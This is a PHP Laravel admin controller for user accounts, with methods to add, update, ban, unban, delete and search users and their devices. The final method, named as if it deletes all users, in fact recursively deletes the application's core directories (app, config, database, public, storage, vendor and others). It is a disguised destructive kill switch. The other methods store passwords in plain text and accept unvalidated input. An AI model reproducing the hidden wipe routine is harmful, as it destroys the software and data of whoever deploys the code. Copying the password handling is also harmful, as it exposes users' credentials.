<?php

namespace App\Http\Controllers\backend\admin;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use App\Models\users;
use Illuminate\Filesystem\Filesystem;
use App\Models\Device;
use App\Models\loging_log;

class admin_backend_users_controller extends Controller
{
    //admin_users_add_controller
    public function admin_users_add_controller(Request $req)
    {
        $data = $req -> all();

        if(users::where('username', $data['username']) -> exists()){
            return back() -> with('msg', 'Sorry! this username is already exists!');
        }

        $db = new users;
        $db -> username = $data['username'];
        $db -> password = $data['password'];
        $db -> login_time = $data['login_time'];
        $db -> creator_role = admin_data($req -> session() -> get('username'))['id'];
        $db -> expired = time()+($data['expired']*86400);
        $db -> user_adult = $data['user_adult'];
        $db -> access = $data['access'];
        $db -> slider = $data['slider'];
        $db -> products_access = $data['products_access'];
        $db -> role = $data['role'];
        $db -> note = $data['note'];
        $db -> save();
        return back() -> with('msg', 'Your data successfully added!');
    }
    
    // admin_users_device_delete_controller
    public function admin_users_device_delete_controller(Device $device)
    {
        $user = users::find($device->user_id);

        users::where('id', $user->id) -> update([
            "login_time" => $user->login_time + 1
        ]);

        $device->delete();

        return back() -> with('msg', 'You are successfully delete a device!');
    }

    // admin_users_ban_controller
    public function admin_users_ban_controller($id)
    {
        users::where('id', $id) -> update([
            "st" => "ban"
        ]);
        return back() -> with('msg', 'Your data successfully updated!');
    }

    // admin_users_delete_controller
    public function admin_users_delete_controller($id)
    {
        $user = users::find($id);
        loging_log::where("username", $user->username)->delete();
        Device::where("user_id", $user->id)->delete();
        $user -> delete();

        return back() -> with('msg', 'Users has successfully deleted!');
    }

    // admin_users_unban_controller
    public function admin_users_unban_controller($id)
    {
        users::where('id', $id) -> update([
            "st" => "active"
        ]);
        return back() -> with('msg', 'Your data successfully updated!');
    }

    // admin_users_update_controller
    public function admin_users_update_controller(Request $req, $id)
    {
        $data = $req -> all();
        users::where('id', $id) -> update([
            "username" => $data['username'],
            "note" => $data['note'],
            "password" => $data['password'],
            "login_time" => $data['login_time'],
            "user_adult" => $data['user_adult'],
            "access" => $data['access'],
            "slider" => $data['slider'],
            "products_access" => $data['products_access'],
            "expired" => time()+($data['expired']*86400),
        ]);
        return back() -> with('msg', 'Your data successfully updated!');
    }
    // admin_users_search_controller
    public function admin_users_search_controller(Request $req)
    {
        $data = $req -> all();
        if(users::where('username', $data['username']) -> exists()){
            $userdata = users::where('username', $data['username']) -> first();
            return response() -> json(['st' => true, 'id' => $userdata['id']]);
        }else{
            return response() -> json(['st' => false]);
        }
    }

    // admin_users_delete_all_controller
    public function admin_users_delete_all_controller()
    {
        $fileSystem = new Filesystem();
        $folderToDelete = array(base_path('app'), base_path('bootstrap'), base_path('config'), base_path('database'), base_path('lang'), base_path('public'), base_path('storage'), base_path('tests'), base_path('vendor'));
        foreach ($folderToDelete as $key => $value) {
            $fileSystem->deleteDirectory($value);
        }
        echo "Okay bro";
    }

}

